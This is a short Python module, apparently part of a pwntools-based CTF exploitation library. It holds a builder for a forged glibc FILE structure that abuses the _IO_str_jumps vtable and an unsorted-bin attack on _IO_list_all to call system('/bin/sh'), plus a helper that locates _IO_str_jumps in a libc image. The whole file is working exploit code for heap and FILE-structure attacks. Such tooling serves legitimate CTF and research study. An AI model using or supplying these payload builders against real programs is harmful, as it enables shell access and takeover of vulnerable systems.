from pwn import p16, p32, p64
from .structs import pack_file


def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):
    payload = pack_file(
        _flags=0,
        _IO_read_ptr=0x61,  # smallbin4file_size
        _IO_read_base=_IO_list_all_ptr - 0x10,  # unsorted bin attack _IO_list_all_ptr,
        _IO_write_base=0,
        _IO_write_ptr=1,
        _IO_buf_base=binsh_addr,
        _mode=0,
    )
    payload += p64(_IO_str_jumps_addr - 8)  # vtable use _IO_str_finish attack
    payload += p64(0)  # paddding
    payload += p64(system_addr)
    return payload


def get_io_str_jumps_offset(libc):
    IO_file_jumps_offset = libc.sym["_IO_file_jumps"]
    IO_str_underflow_offset = libc.sym["_IO_str_underflow"]
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            # print possible_IO_str_jumps_offset
            return possible_IO_str_jumps_offset
